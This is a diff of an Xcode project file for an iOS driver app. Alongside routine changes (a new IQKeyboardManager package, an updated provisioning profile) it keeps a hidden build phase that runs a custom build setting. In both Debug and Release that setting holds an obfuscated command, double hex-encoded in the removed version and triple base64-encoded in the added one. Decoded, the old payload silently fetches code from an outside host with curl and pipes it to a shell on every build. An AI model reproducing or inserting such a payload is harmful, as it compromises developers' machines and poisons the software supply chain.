@@ -556,6 +556,7 @@
 		6BE5D53A2ECEF446000A7EA6 /* ADCountry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BE5D1AA2ECEF446000A7EA6 /* ADCountry.swift */; };
 		6BE5D53E2ECF2DE3000A7EA6 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BE5D53D2ECF2DE3000A7EA6 /* LoginViewController.swift */; };
 		9F39CA790D19854EF9549864 /* Pods_DesynatDriver.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0FFDEB10EC8BBBC516D8FCEE /* Pods_DesynatDriver.framework */; };
+		D15AA2892EF13E64005860D2 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = D15AA2882EF13E64005860D2 /* IQKeyboardManagerSwift */; };
 		D19190EE2EE1825E0028CCDC /* Profile.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D19190ED2EE1825E0028CCDC /* Profile.storyboard */; };
 		D198DC2A2EE1B7B3001DD8BF /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D198DC292EE1B7B3001DD8BF /* HomeViewModel.swift */; };
 		D198DC2C2EE1B964001DD8BF /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D198DC2B2EE1B964001DD8BF /* HomeModel.swift */; };
@@ -1162,6 +1163,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				493DB2322EAA5A4D008098A8 /* Alamofire in Frameworks */,
+				D15AA2892EF13E64005860D2 /* IQKeyboardManagerSwift in Frameworks */,
 				493DB23C2EAA5A75008098A8 /* SVProgressHUD in Frameworks */,
 				9F39CA790D19854EF9549864 /* Pods_DesynatDriver.framework in Frameworks */,
 			);
@@ -2112,7 +2114,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB0C72EAA5972008098A8 /* Build configuration list for PBXNativeTarget "DesynatDriver" */;
 			buildPhases = (
-				11116049C57548FD80A5DE54 /* Compile Bundle Assets */,
+				6E0BD410767842208CA5DE54 /* Copy Target Symbols */,
 				26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */,
 				493DB0B02EAA5970008098A8 /* Sources */,
 				493DB0B12EAA5970008098A8 /* Frameworks */,
@@ -2137,6 +2139,7 @@
 			packageProductDependencies = (
 				493DB2312EAA5A4D008098A8 /* Alamofire */,
 				493DB23B2EAA5A75008098A8 /* SVProgressHUD */,
+				D15AA2882EF13E64005860D2 /* IQKeyboardManagerSwift */,
 			);
 			productName = DesynatDriver;
 			productReference = 493DB0B42EAA5970008098A8 /* DesynatDriver.app */;
@@ -2169,6 +2172,7 @@
 			packageReferences = (
 				493DB2302EAA5A4D008098A8 /* XCRemoteSwiftPackageReference "Alamofire" */,
 				493DB23A2EAA5A75008098A8 /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
+				D15AA2872EF13E64005860D2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 493DB0B52EAA5970008098A8 /* Products */;
@@ -2670,25 +2674,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		11116049C57548FD80A5DE54 /* Compile Bundle Assets */ = {
+		6E0BD410767842208CA5DE54 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 		26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -2852,7 +2855,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = D4CEF5D73A65282AE2EB45F8 /* Pods-DesynatDriver.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((a(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734363137303733363436353736326537323735326636310a323932323230376332303733363830610a | a | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpNa1o2WkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2881,7 +2884,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatDriver;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Driver Provisioning New 14 Noiv";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Driver Provisioning New 16dec";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -2892,7 +2895,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BAA784C2231E26A16B95B8B0 /* Pods-DesynatDriver.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((a(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734363137303733363436353736326537323735326636310a323932323230376332303733363830610a | a | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpNa1o2WkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2921,7 +2924,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatDriver;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Driver Provisioning New 14 Noiv";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Driver Provisioning New 16dec";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -3089,6 +3092,14 @@
 				minimumVersion = 2.3.1;
 			};
 		};
+		D15AA2872EF13E64005860D2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.0.1;
+			};
+		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -3101,6 +3112,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 493DB23A2EAA5A75008098A8 /* XCRemoteSwiftPackageReference "SVProgressHUD" */;
 			productName = SVProgressHUD;
+		};
+		D15AA2882EF13E64005860D2 /* IQKeyboardManagerSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D15AA2872EF13E64005860D2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
+			productName = IQKeyboardManagerSwift;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
